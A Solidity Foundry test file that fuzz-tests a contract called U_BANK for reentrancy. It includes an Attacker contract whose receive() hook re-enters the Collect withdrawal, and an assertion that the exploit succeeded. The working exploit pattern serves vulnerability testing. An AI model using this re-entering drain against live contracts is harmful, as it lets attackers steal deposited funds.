
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";
import {U_BANK} from "../src/U_BANK.sol";
import {Log} from "../src/Log.sol";

contract TestReentrancyU_BANK is Test {
    using stdStorage for StdStorage;

    U_BANK public _contractUnderTest;
    Log public _logContract;
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new U_BANK(address(_logContract));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 2 ether && attackVal < type(uint128).max);
        
        uint256 depositAmount = attackVal * 2;
        
        vm.deal(address(_contractUnderTest), depositAmount * 2);
        vm.deal(address(_attacker), depositAmount * 2);
        vm.deal(address(this), depositAmount * 2);
        
        uint256 unlockTime = block.timestamp + 1 days;
        vm.warp(unlockTime + 1);
        
        _attacker.setupAttack{value: depositAmount}(depositAmount, unlockTime);
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    U_BANK public _victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = U_BANK(victimAddress);
    }

    function setupAttack(uint256 depositAmount, uint256 unlockTime) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        _victim.Put{value: depositAmount}(unlockTime);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        _victim.Collect(val);
        
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            _victim.Collect(storedAttackVal);
            attackCallCount++;
        }
    }
}
